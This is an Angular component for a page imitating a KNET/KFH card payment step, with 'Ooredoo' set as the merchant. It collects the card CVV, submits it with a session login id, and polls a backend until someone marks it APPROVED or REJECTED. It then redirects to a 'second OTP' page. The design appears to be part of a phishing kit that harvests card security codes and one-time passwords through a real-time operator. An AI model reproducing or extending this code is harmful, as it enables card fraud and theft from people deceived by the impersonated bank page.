import { DOCUMENT, CommonModule } from '@angular/common';
import { Component, Inject, OnDestroy, OnInit, Renderer2 } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { PaymentService } from '../../services/payment.service';

@Component({
  selector: 'app-knet-cvv',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet-cvv.html',
  styleUrl: './knet-cvv.css',
})
export class KnetCvv implements OnInit, OnDestroy {
  bannerImagePath = 'imgs/mob.jpg';
  kfhLogoPath = 'imgs/download.jpg';
  loadingGifPath = 'imgs/photo_loader.gif';

  merchantName = 'Ooredoo';
  amount = 0;

  cvv = '';
  formError: string | null = null;
  view: 'form' | 'loading' = 'form';

  private pollId: ReturnType<typeof setInterval> | null = null;
  private clientId: string | null = null;

  private readonly bodyBgClass = 'bg-[#d9d9d9]';
  private readonly bodyOverflowClass = 'overflow-hidden';

  constructor(
    private readonly renderer: Renderer2,
    @Inject(DOCUMENT) private readonly document: Document,
    private readonly router: Router,
    private paymentService: PaymentService
  ) { }

  ngOnInit(): void {
    this.renderer.addClass(this.document.body, this.bodyBgClass);
    this.renderer.addClass(this.document.body, this.bodyOverflowClass);

    this.clientId = sessionStorage.getItem('loginId');

    // Retrieve KNET form details to display Amount and Merchant Name (if needed)
    const rawKnet = sessionStorage.getItem('eventat_knet_form');
    if (rawKnet) {
      try {
        const parsed = JSON.parse(rawKnet);
        const total = Number(parsed?.amount);
        if (Number.isFinite(total)) this.amount = total;
        const m = String(parsed?.merchantName ?? '').trim();
        if (m) this.merchantName = m;
      } catch {
        // ignore
      }
    }

    if (!this.amount) {
      const rawCheckout = sessionStorage.getItem('eventat_checkout');
      if (rawCheckout) {
        try {
          const parsed = JSON.parse(rawCheckout);
          const total = Number(parsed?.totalPrice);
          if (Number.isFinite(total)) this.amount = total;
        } catch {
          // ignore
        }
      }
    }
  }

  ngOnDestroy(): void {
    this.renderer.removeClass(this.document.body, this.bodyBgClass);
    this.renderer.removeClass(this.document.body, this.bodyOverflowClass);
    if (this.pollId) clearInterval(this.pollId);
  }

  private digitsOnly(value: string, maxLen: number) {
    return (value ?? '').replace(/\D+/g, '').slice(0, maxLen);
  }

  onCvvInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const cleaned = this.digitsOnly(input?.value ?? '', 3);
    this.cvv = cleaned;
    if (input && input.value !== cleaned) input.value = cleaned;
    this.formError = null;
  }

  digitsOnlyKeydown(event: KeyboardEvent, maxLen: number) {
    const allowedKeys = new Set([
      'Backspace', 'Delete', 'Tab', 'Enter', 'Escape',
      'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
      'Home', 'End',
    ]);

    if (allowedKeys.has(event.key)) return;
    if (event.ctrlKey || event.metaKey) return;

    if (!/^\d$/.test(event.key)) {
      event.preventDefault();
      return;
    }

    const input = event.target as HTMLInputElement | null;
    if (!input) return;
    const value = input.value ?? '';
    const selStart = input.selectionStart ?? value.length;
    const selEnd = input.selectionEnd ?? value.length;
    const selectedCount = Math.max(0, selEnd - selStart);
    if (value.length - selectedCount >= maxLen) event.preventDefault();
  }

  digitsOnlyPaste(event: ClipboardEvent, maxLen: number) {
    event.preventDefault();
    const input = event.target as HTMLInputElement | null;
    if (!input) return;

    const pasteText = event.clipboardData?.getData('text') ?? '';
    const toInsert = this.digitsOnly(pasteText, maxLen);

    const value = input.value ?? '';
    const selStart = input.selectionStart ?? value.length;
    const selEnd = input.selectionEnd ?? value.length;

    const combined = this.digitsOnly(value.slice(0, selStart) + toInsert + value.slice(selEnd), maxLen);
    input.value = combined;
    this.cvv = combined;
    this.formError = null;
  }

  onSubmit(): void {
    if (!this.cvv || this.cvv.length !== 3) {
      this.formError = 'Please enter a valid CVV/CVC (exactly 3 digits).';
      return;
    }

    this.formError = null;
    this.view = 'loading';

    this.paymentService.submitCvv(this.cvv, this.clientId || '').subscribe({
      next: (res: any) => {
        if (res.success) {
          this.startPolling(res.cvvId);
        } else {
          this.view = 'form';
          this.formError = 'Error submitting CVV.';
        }
      },
      error: (err: any) => {
        console.error(err);
        this.view = 'form';
        this.formError = 'System error.';
      }
    });
  }

  startPolling(cvvId: string) {
    if (this.pollId) clearInterval(this.pollId);
    this.pollId = setInterval(() => {
      this.paymentService.checkCvvStatus(cvvId).subscribe({
        next: (res: any) => {
          if (res.status === 'APPROVED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            // Mark CVV as approved for the next step
            sessionStorage.setItem('cvv_approved', 'true');
            // Redirect to OTP again for the SECOND OTP
            this.router.navigate(['/knet-otp']);
          } else if (res.status === 'REJECTED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            this.view = 'form';
            this.formError = 'تم الرفض، يرجى المحاولة مرة أخرى.';
          }
        },
        error: () => { }
      });
    }, 2000);
  }

  onCancel(): void {
    window.history.back();
  }
}
